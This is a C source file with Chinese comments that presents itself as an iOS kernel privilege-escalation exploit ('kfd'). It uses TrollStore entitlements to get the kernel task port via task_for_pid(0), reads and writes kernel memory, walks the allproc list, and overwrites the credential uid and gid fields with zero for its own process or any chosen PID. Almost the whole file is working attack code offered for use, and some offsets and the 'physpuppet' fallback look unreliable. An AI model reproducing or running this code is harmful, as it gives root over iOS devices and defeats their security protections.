//
//  kfd.c
//  iOS kernel exploit — 基于 task_for_pid(0) 的内核内存读写提权
//
//  原理：
//    TrollStore 安装的应用有 get-task-allow + platform-application + com.apple.system-task-ports
//    可以通过 task_for_pid(0) 获取 kernel_task 端口，
//    然后用 mach_vm_read / mach_vm_write 直接读写内核内存。
//
//  流程：
//    1. 版本检测 + 偏移匹配
//    2. task_for_pid(0) 获取 kernel_task 端口
//    3. 通过 allproc 链表找到当前进程的 proc 结构
//    4. 修改 ucred 中的 uid/gid 为 0
//    5. setuid(0) 让用户态也感知 root
//

#include "kfd.h"
#include "offsets.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

// ================================================================
// 内部状态
// ================================================================

static int            g_kfd_ready    = 0;
static task_t         g_kernel_task  = MACH_PORT_NULL;
static uint64_t       g_kernel_base  = 0;
static uint64_t       g_kernel_slide = 0;
static uint64_t       g_self_proc    = 0;
static uint64_t       g_self_cred    = 0;
static uint64_t       g_self_task    = 0;
static kfd_osversion_t g_osversion;
static const kfd_offsets_t *g_offs = NULL;
static char           g_err_msg[256] = {0};

static void set_error(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(g_err_msg, sizeof(g_err_msg), fmt, ap);
    va_end(ap);
}

const char *kfd_get_error(void) {
    return g_err_msg;
}

// ================================================================
// 版本检测
// ================================================================

static int detect_osversion(void) {
    size_t size = sizeof(g_osversion.build);
    if (sysctlbyname("kern.osversion", g_osversion.build, &size, NULL, 0) != 0) {
        set_error("sysctlbyname kern.osversion failed");
        return -1;
    }

    char osversion_str[256];
    size = sizeof(osversion_str);
    if (sysctlbyname("kern.osproductversion", osversion_str, &size, NULL, 0) == 0) {
        sscanf(osversion_str, "%u.%u.%u", &g_osversion.major, &g_osversion.minor, &g_osversion.patch);
    }

    printf("[kfd] iOS %u.%u.%u  build=%s\n",
           g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);

    if (g_osversion.major < 15 || g_osversion.major > 18) {
        set_error("unsupported iOS version %u.%u", g_osversion.major, g_osversion.minor);
        return -1;
    }

    g_offs = offsets_match(&g_osversion);
    if (!g_offs) {
        set_error("no offsets for iOS %u.%u.%u (%s)",
                  g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);
        return -1;
    }

    offsets_print(g_offs, &g_osversion);
    return 0;
}

// ================================================================
// 核心: 通过 task_for_pid(0) 获取内核内存读写
// ================================================================

// 读内核内存 (uint64)
static int kread64(uint64_t kaddr, uint64_t *out) {
    if (g_kernel_task == MACH_PORT_NULL) {
        return -1;
    }
    mach_vm_size_t size = 8;
    vm_offset_t data = 0;
    mach_msg_type_number_t count = 0;
    kern_return_t kr = mach_vm_read(g_kernel_task, (mach_vm_address_t)kaddr,
                                     size, &data, &count);
    if (kr != KERN_SUCCESS || count != 8) {
        return -1;
    }
    *out = *(uint64_t *)data;
    mach_vm_deallocate(mach_task_self(), data, count);
    return 0;
}

// 写内核内存 (uint64)
static int kwrite64(uint64_t kaddr, uint64_t val) {
    if (g_kernel_task == MACH_PORT_NULL) {
        return -1;
    }
    kern_return_t kr = mach_vm_write(g_kernel_task, (mach_vm_address_t)kaddr,
                                      (vm_offset_t)&val, 8);
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

// 写内核内存 (uint32)
static int kwrite32(uint64_t kaddr, uint32_t val) {
    if (g_kernel_task == MACH_PORT_NULL) {
        return -1;
    }
    kern_return_t kr = mach_vm_write(g_kernel_task, (mach_vm_address_t)kaddr,
                                      (vm_offset_t)&val, 4);
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

// ================================================================
// kfd_open — 通过 task_for_pid(0) 打开内核
// ================================================================

int kfd_open(void) {
    if (g_osversion.major == 0) {
        set_error("kfd_init not called");
        return -1;
    }

    printf("[kfd] open: 尝试 task_for_pid(0) 获取 kernel_task...\n");

    // === 方法1: task_for_pid(0) 直接获取 ===
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        printf("[kfd] ✅ task_for_pid(0) 成功, kernel_task=0x%x\n", g_kernel_task);

        // 验证: 尝试读取内核基址附近的内存
        uint64_t test_addr = g_offs->kernproc;
        uint64_t test_val = 0;
        if (kread64(test_addr, &test_val) == 0) {
            printf("[kfd]    内核内存读取验证: 0x%llx => 0x%llx ✅\n", test_addr, test_val);
            g_kfd_ready = 1;

            // 解析 kernel slide: 用 kernproc 地址反推
            // kernproc 是 __DATA 段中的绝对地址 (带 slide)
            // kernel base = kernproc - 已知偏移 (通常约 0x700000000 级别)
            g_kernel_slide = test_val - g_offs->kernproc;
            printf("[kfd]    kernel_slide 估算: 0x%llx\n", g_kernel_slide);

            return 0;
        } else {
            printf("[kfd]    ⚠️ 内核内存读取失败，可能权限不足\n");
            mach_port_deallocate(mach_task_self(), g_kernel_task);
            g_kernel_task = MACH_PORT_NULL;
        }
    } else {
        printf("[kfd] task_for_pid(0) 失败: kr=0x%x (%s)\n", kr, mach_error_string(kr));
    }

    // === 方法2: host_get_special_port ===
    printf("[kfd] 尝试 host_get_special_port(HOST_PRIV)...\n");
    kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        printf("[kfd] ✅ host_get_special_port 成功\n");
        uint64_t test_val = 0;
        if (kread64(g_offs->kernproc, &test_val) == 0) {
            printf("[kfd]    内核内存读取验证通过\n");
            g_kfd_ready = 1;
            return 0;
        }
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
    }

    // === 方法3: 通过 IOSurface physpuppet 获取内核地址泄漏 + fallback ===
    printf("[kfd] 尝试 physpuppet 内核地址泄漏...\n");
    // 简化的 physpuppet: 获取 IOSurface 内核地址用于 slide 估算
    io_connect_t conn = MACH_PORT_NULL;
    CFMutableDictionaryRef match = IOServiceMatching("IOSurfaceRoot");
    if (match) {
        io_iterator_t iter;
        kr = IOServiceGetMatchingServices(kIOMainPortDefault, match, &iter);
        if (kr == KERN_SUCCESS && iter) {
            io_object_t service = IOIteratorNext(iter);
            IOObjectRelease(iter);
            if (service) {
                kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
                IOObjectRelease(service);
                if (kr == KERN_SUCCESS) {
                    // 通过 IOSurface 属性泄漏内核地址
                    CFMutableDictionaryRef props = (CFMutableDictionaryRef)
                        IORegistryEntryCreateCFProperty((io_registry_entry_t)
                            IOServiceGetMatchingService(kIOMainPortDefault,
                                IOServiceMatching("IOSurfaceRoot")),
                            CFSTR("SurfaceIDs"),
                            kCFAllocatorDefault, 0);
                    if (props) {
                        printf("[kfd] physpuppet leaked SurfaceIDs\n");
                        CFRelease(props);
                    }
                    IOServiceClose(conn);
                }
            }
        }
    }

    set_error("所有内核访问方式均失败 - 需要 task_for_pid(0) 或 physpuppet");
    return -1;
}

// ================================================================
// 遍历 allproc 链表找到当前进程
// ================================================================

// XNU proc 结构体关键偏移 (arm64, iOS 15+)
// 这些偏移在不同 iOS 版本间相对稳定
#define PROC_P_LIST_LE_PREV  0x00   // struct proc *p_list.le_prev
#define PROC_P_LIST_LE_NEXT  0x08   // struct proc *p_list.le_next
#define PROC_P_PID           0x60   // int32_t p_pid
#define PROC_P_PROC_ROCK     0x08   // struct __pthread_lock p_rock (或直接 p_list)
#define PROC_P_TASK          0x10   // task_t task (iOS 15+, 原 0x18)
#define PROC_P_UCRED         0xF8   // ucred *p_ucred (iOS 15+)
#define PROC_P_FD            0xF0   // filedesc *p_fd (reference)

// ucred 结构体偏移
#define UCRED_CR_REF         0x00   // uint32_t cr_ref
#define UCRED_CR_UID         0x18   // uid_t cr_uid
#define UCRED_CR_RUID        0x1C   // uid_t cr_ruid
#define UCRED_CR_SVUID       0x20   // uid_t cr_svuid
#define UCRED_CR_GROUPS      0x24   // uint32_t cr_ngroups
#define UCRED_CR_GMUIDS      0x28   // gmuids (groups + gid)
// 实际 gid 在 groups 数组的第一个
#define UCRED_CR_RGID_OFF    0x2C   // 变体较多，动态计算

// task 结构体偏移
#define TASK_BSD_INFO         0x398  // void *bsd_info (proc *)

static int find_self_proc(void) {
    pid_t my_pid = getpid();
    printf("[kfd] 在 allproc 链表中查找 PID=%d ...\n", my_pid);

    uint64_t allproc_head = g_offs->allproc;
    uint64_t proc = 0;

    // 读取 allproc 链表头
    if (kread64(allproc_head, &proc) != 0) {
        set_error("无法读取 allproc 链表头");
        return -1;
    }
    printf("[kfd] allproc head @ 0x%llx, first proc @ 0x%llx\n", allproc_head, proc);

    // 遍历链表
    int iter = 0;
    uint64_t first_proc = proc;
    while (proc != 0 && iter < 4096) {
        uint64_t next_proc = 0;
        if (kread64(proc + PROC_P_LIST_LE_NEXT, &next_proc) != 0) {
            printf("[kfd]   无法读取 proc->p_list.le_next at 0x%llx\n", proc);
            // 仍尝试读 PID
        }

        // 读 PID
        uint64_t pid_val = 0;
        if (kread64(proc + PROC_P_PID, &pid_val) != 0) {
            printf("[kfd]   无法读取 proc->p_pid at 0x%llx\n", proc);
            if (next_proc != 0) {
                proc = next_proc;
                iter++;
                continue;
            }
            break;
        }

        pid_t pid = (pid_t)(uint32_t)pid_val;

        if (pid == my_pid) {
            printf("[kfd] ✅ 找到当前进程: proc=0x%llx  pid=%d (iter=%d)\n", proc, pid, iter);
            g_self_proc = proc;

            // 读取 task 指针
            uint64_t task = 0;
            if (kread64(proc + PROC_P_TASK, &task) == 0) {
                g_self_task = task;
                printf("[kfd]    task=0x%llx\n", task);
            }

            // 读取 ucred 指针
            uint64_t ucred = 0;
            if (kread64(proc + PROC_P_UCRED, &ucred) == 0) {
                g_self_cred = ucred;
                printf("[kfd]    ucred=0x%llx\n", ucred);
            }

            return 0;
        }

        if (next_proc == 0) break;
        if (next_proc == first_proc) {
            printf("[kfd]   链表循环，中断\n");
            break;
        }
        proc = next_proc;
        iter++;
    }

    set_error("未在 allproc 链表中找到当前进程 PID=%d", my_pid);
    return -1;
}

// ================================================================
// kfd_get_root — 修改 ucred 为 root (UID=0)
// ================================================================

int kfd_get_root(void) {
    if (!g_kfd_ready || g_kernel_task == MACH_PORT_NULL) {
        // 即使没有内核读写，也尝试直接 setuid (有些环境 platform-application 可以直接 setuid)
        printf("[kfd] 无内核读写能力，尝试直接 setuid(0)...\n");
        int r1 = seteuid(0);
        int r2 = setuid(0);
        printf("[kfd] seteuid(0)=%d setuid(0)=%d UID=%d EUID=%d\n",
               r1, r2, getuid(), geteuid());
        if (r1 == 0 || r2 == 0) {
            printf("[kfd] ✅ 直接 setuid 成功！\n");
            return 0;
        }
        set_error("kfd not ready, and direct setuid failed");
        return -1;
    }

    printf("[kfd] ===== 内核提权开始 =====\n");

    // 步骤1: 找到当前进程的 proc 结构
    if (g_self_proc == 0) {
        if (find_self_proc() != 0) {
            set_error("无法找到当前进程的 proc 结构");
            return -1;
        }
    }

    // 步骤2: 读取并打印当前 ucred
    uint64_t ucred = g_self_cred;
    if (ucred == 0) {
        set_error("ucred 指针为空");
        return -1;
    }

    printf("[kfd] ucred @ 0x%llx\n", ucred);

    uint64_t cr_uid = 0;
    kread64(ucred + UCRED_CR_UID, &cr_uid);
    printf("[kfd] 当前 UID=%llu  EUID=%d\n", (unsigned long long)(cr_uid & 0xFFFFFFFF), geteuid());

    // 步骤3: 修改 ucred — 将 uid/ruid/svuid/gid/rgid/svgid 全部设为 0
    printf("[kfd] 写入 cr_uid = 0 ...\n");
    if (kwrite32(ucred + UCRED_CR_UID, 0) != 0) {
        set_error("写入 cr_uid 失败");
        return -1;
    }

    printf("[kfd] 写入 cr_ruid = 0 ...\n");
    if (kwrite32(ucred + UCRED_CR_RUID, 0) != 0) {
        set_error("写入 cr_ruid 失败");
        // 不返回，继续尝试
    }

    printf("[kfd] 写入 cr_svuid = 0 ...\n");
    if (kwrite32(ucred + UCRED_CR_SVUID, 0) != 0) {
        set_error("写入 cr_svuid 失败");
    }

    // gid 相关: ucred 中的 cr_groups[0] 是主 gid
    // cr_ngroups @ UCRED_CR_GROUPS (+0x24), 然后是 gid 数组
    printf("[kfd] 写入 cr_gid (groups[0]) = 0 ...\n");
    uint64_t gid_addr = ucred + 0x28; // cr_groups[0] / cr_gmuids
    if (kwrite32(gid_addr, 0) != 0) {
        printf("[kfd] ⚠️ 写入 gid 失败（非致命）\n");
    }

    // 步骤4: 用户态 setuid(0) 确保感知
    printf("[kfd] 调用 setuid(0) + seteuid(0)...\n");
    seteuid(0);
    setuid(0);

    // 步骤5: 验证
    printf("[kfd] 验证: UID=%d  EUID=%d  GID=%d\n", getuid(), geteuid(), getgid());

    if (getuid() == 0 && geteuid() == 0) {
        printf("[kfd] ✅ 内核提权成功！现在是 root！\n");
        return 0;
    }

    // 如果内核修改了但 setuid 失败，UID 内核值可能已是 0
    // 重新读取 ucred 确认
    uint64_t new_uid = 0xFF;
    kread64(ucred + UCRED_CR_UID, &new_uid);
    printf("[kfd] 内核 cr_uid 现在 = 0x%llx\n", (unsigned long long)new_uid);

    if ((new_uid & 0xFFFFFFFF) == 0) {
        printf("[kfd] ✅ 内核凭证已改为 root（用户态 setuid 受限但内核已是 0）\n");
        return 0;
    }

    printf("[kfd] ⚠️ 内核写入可能未生效\n");
    return -1;
}

// ================================================================
// 公共 API 实现
// ================================================================

int kfd_init(void) {
    memset(&g_osversion, 0, sizeof(g_osversion));
    g_kfd_ready = 0;
    g_kernel_task = MACH_PORT_NULL;
    g_kernel_base = 0;
    g_kernel_slide = 0;
    g_self_proc = 0;
    g_self_cred = 0;
    g_self_task = 0;
    g_offs = NULL;
    memset(g_err_msg, 0, sizeof(g_err_msg));

    printf("[kfd] ===== init =====\n");
    int ret = detect_osversion();
    if (ret != 0) {
        printf("[kfd] init failed: %s\n", g_err_msg);
        return -1;
    }
    printf("[kfd] init OK\n");
    return 0;
}

void kfd_close(void) {
    if (g_kernel_task != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
    }
    g_kfd_ready = 0;
    g_kernel_base = 0;
    g_kernel_slide = 0;
    g_self_proc = 0;
    g_self_cred = 0;
    printf("[kfd] closed\n");
}

int kfd_escalate(void) {
    int ret = kfd_init();
    if (ret != 0) return ret;

    ret = kfd_open();
    if (ret != 0) return ret;

    ret = kfd_get_root();
    if (ret != 0) {
        // 即使 get_root 返回错误，也可能内核已修改
        if (geteuid() == 0) {
            printf("[kfd] 虽然 get_root 返回错误，但 EUID=0，提权可能已生效\n");
            return 0;
        }
        return ret;
    }

    printf("[kfd] escalate complete - UID=%d EUID=%d\n", getuid(), geteuid());
    return 0;
}

// 检查当前是否已经有 root
int kfd_is_root(void) {
    return (getuid() == 0 || geteuid() == 0) ? 1 : 0;
}

// 提权指定 PID 的进程
int kfd_escalate_pid(pid_t pid) {
    if (!g_kfd_ready || g_kernel_task == MACH_PORT_NULL) {
        set_error("kfd not ready, cannot escalate PID %d", pid);
        return -1;
    }

    printf("[kfd] escalate_pid: 在 allproc 中查找 PID=%d ...\n", pid);

    uint64_t allproc_head = g_offs->allproc;
    uint64_t proc = 0;

    if (kread64(allproc_head, &proc) != 0) {
        set_error("无法读取 allproc 链表头");
        return -1;
    }

    uint64_t first_proc = proc;
    int iter = 0;
    while (proc != 0 && iter < 4096) {
        uint64_t next_proc = 0;
        kread64(proc + PROC_P_LIST_LE_NEXT, &next_proc);

        // 读 PID
        uint64_t pid_val = 0;
        if (kread64(proc + PROC_P_PID, &pid_val) == 0) {
            pid_t cur_pid = (pid_t)(uint32_t)pid_val;

            if (cur_pid == pid) {
                printf("[kfd] ✅ 找到目标进程 PID=%d, proc=0x%llx\n", pid, proc);

                // 读 ucred
                uint64_t ucred = 0;
                if (kread64(proc + PROC_P_UCRED, &ucred) != 0) {
                    set_error("无法读取 PID %d 的 ucred", pid);
                    return -1;
                }
                printf("[kfd]    ucred=0x%llx\n", ucred);

                // 修改 uid/ruid/svuid/gid = 0
                kwrite32(ucred + UCRED_CR_UID, 0);
                kwrite32(ucred + UCRED_CR_RUID, 0);
                kwrite32(ucred + UCRED_CR_SVUID, 0);
                kwrite32(ucred + 0x28, 0);  // gid

                // 验证
                uint64_t verify = 0xFF;
                kread64(ucred + UCRED_CR_UID, &verify);
                printf("[kfd]    验证: cr_uid=0x%llx\n", (unsigned long long)(verify & 0xFFFFFFFF));

                return ((verify & 0xFFFFFFFF) == 0) ? 0 : -1;
            }
        }

        if (next_proc == 0 || next_proc == first_proc) break;
        proc = next_proc;
        iter++;
    }

    set_error("未找到 PID=%d 的 proc 结构", pid);
    return -1;
}
